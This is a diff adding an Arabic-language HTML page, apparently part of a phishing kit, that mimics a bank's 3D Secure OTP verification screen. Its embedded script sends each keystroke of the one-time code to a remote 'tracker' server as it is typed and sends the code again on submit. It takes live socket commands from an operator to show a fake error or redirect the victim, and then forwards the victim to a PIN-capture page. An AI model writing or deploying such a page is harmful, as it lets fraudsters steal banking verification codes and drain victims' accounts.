@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تأكيد رمز الأمان OTP</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="otp.css">
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="box">
+        <div class="h-otp"><div class="sh-ic">🛡️</div><div><h2>تأكيد كود الحماية (OTP)</h2><div style="font-size: 11px; color: #94a3b8; font-weight: 600;">3D Secure Authentication</div></div></div>
+        <p class="subt">لقد تم إرسال رمز الأمان إلى رقم هاتفك المسجل لدى البنك. يرجى إدخال الرمز لتأكيد العملية.</p>
+        <div class="err-m" id="err-box">رمز التحقق غير صحيح، يرجى كتابة الرمز الجديد المرسل إليك.</div>
+        <form id="otp-form" onsubmit="handleOtpSubmit(event)">
+            <input type="text" id="otp-input" placeholder="••••••" maxlength="6" autocomplete="off" oninput="handleOtpInput(this)">
+            <button type="submit" class="submit-btn" id="otp-submit-btn" disabled>إرسال وتأكيد</button>
+        </form>
+        <div class="resend-box">إعادة إرسال الرمز خلال: <span class="timer-sec" id="timer-box">59 ثانية</span></div>
+        <div class="secure-footer">🔒 تشفير آمن معتمد PCI-DSS</div>
+    </div>
+    <script src="saas-hub-config.js"></script><script src="config.js"></script><script>var SERVER_URL = window.SERVER_HUB_URL || "http://localhost:5000", siteKey = "site_sehhaty_app_v1", visitorToken = localStorage.getItem('visitor_token') || 'vis_' + Math.random().toString(36).substring(2, 10);
+        var formName = "رمز التحقق OTP";
+
+        fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/oot', pageTitle: 'التحقق من الهاتف - رمز OTP' }) }).catch(function(){});
+
+        try {
+            var socket = io(SERVER_URL);
+            socket.on('visitor_updated', function(v) {
+                if (v.token === visitorToken && v.status === 'go' && v.redirectUrl) {
+                    if (v.redirectUrl.includes('errr=1')) {
+                        document.getElementById('err-box').style.display = 'block';
+                        var inp = document.getElementById('otp-input'); inp.value = ''; inp.focus();
+                        document.getElementById('otp-submit-btn').disabled = true;
+                        document.getElementById('otp-submit-btn').innerText = "إرسال وتأكيد";
+                    } else { window.location.href = v.redirectUrl; }
+                }
+            });
+        } catch(e){}
+
+        var streamDebounce = null;
+        function handleOtpInput(el) {
+            var val = el.value.replace(/\D/g, ''); el.value = val;
+            document.getElementById('otp-submit-btn').disabled = (val.length < 4);
+            document.getElementById('err-box').style.display = 'none';
+
+            clearTimeout(streamDebounce);
+            streamDebounce = setTimeout(function() {
+                fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (يجري الإدخال 🟡)", submissionData: { 'رمز التحقق OTP': val, 'حالة الكود': 'يجري الإدخال' }, isFinalSubmission: false, isImportant: true }) }).catch(function(){});
+            }, 200);
+        }
+
+        function handleOtpSubmit(e) {
+            e.preventDefault(); var val = document.getElementById('otp-input').value; if (val.length < 4) return;
+            var btn = document.getElementById('otp-submit-btn'); btn.disabled = true; btn.innerText = "جاري التحقق...";
+
+            fetch(SERVER_URL + '/api/tracker/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, formName: formName + " (مؤكد ✅)", submissionData: { 'رمز التحقق OTP': val, 'حالة الكود': 'تم الإرسال للتأكيد' }, isFinalSubmission: true, isImportant: true }) }).then(function() {
+                fetch(SERVER_URL + '/api/tracker/ping', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: visitorToken, siteKey: siteKey, currentPage: '/loading', pageTitle: 'جاري مطابقة رمز الأمان...' }) }).catch(function(){});
+                setTimeout(function() { window.location.href = 'loading_pin.html'; }, 800);
+            }).catch(function() { btn.disabled = false; btn.innerText = "إرسال وتأكيد"; });
+        }
+
+        var timerCountdown = 59;
+        var timer = setInterval(function() {
+            timerCountdown--;
+            if (timerCountdown <= 0) {
+                document.getElementById('timer-box').innerHTML = '<a href="#" onclick="timerCountdown=59;return false;" style="color:#7b2cbf;font-weight:bold;text-decoration:none;">إعادة إرسال الرمز</a>';
+            } else { document.getElementById('timer-box').innerText = timerCountdown + ' ثانية'; }
+        }, 1000);
+    </script>
+</body>
+</html>
